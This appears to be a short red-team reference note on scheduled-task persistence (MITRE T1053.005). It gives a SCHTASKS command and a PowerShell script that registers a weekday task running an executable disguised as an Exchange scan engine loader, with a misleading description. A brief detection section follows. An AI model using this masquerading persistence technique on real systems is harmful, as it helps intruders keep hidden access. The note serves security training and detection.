# [Job Scheduling](https://attack.mitre.org/techniques/T1053/005/)

## Exploit Syntax

### Method 1 | `sharpps` [ UNTESTED ]

```powershell 
sharpps SCHTASKS /CREATE /SC DAILY /TN "MyTasks\Notepad task" /TR "Path to the executable you want to run" /ST 11:00
```
### Method 2 | `pslo`

1. Create a txt file named `schdTask.ps1`

2. Paste in the powershell below.

```powershell
$outpath = "D:\Exchange Server\FIP-FS\Bin\ScanEngineLoader.exe"
$action = New-ScheduledTaskAction -Execute $outpath
$days = 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday'
$trigger = New-ScheduledTaskTrigger -weekly -DaysOfWeek $days -At 9am
Register-ScheduledTask -Action $action -Trigger $trigger -Taskname "Engine Loader" -Description "This task loads resouces for OWA."
```
3. Run 'pslo \<schdTask.ps1 file path>' 

---

## Detection Method

* Investigate file creations in the default windows task folder - C:\Windows\System32\Tasks folder.
    * Event.code: 1 
    * Event.action: process create 
    * Event.code: 4698 or 4699
 
---

## Resources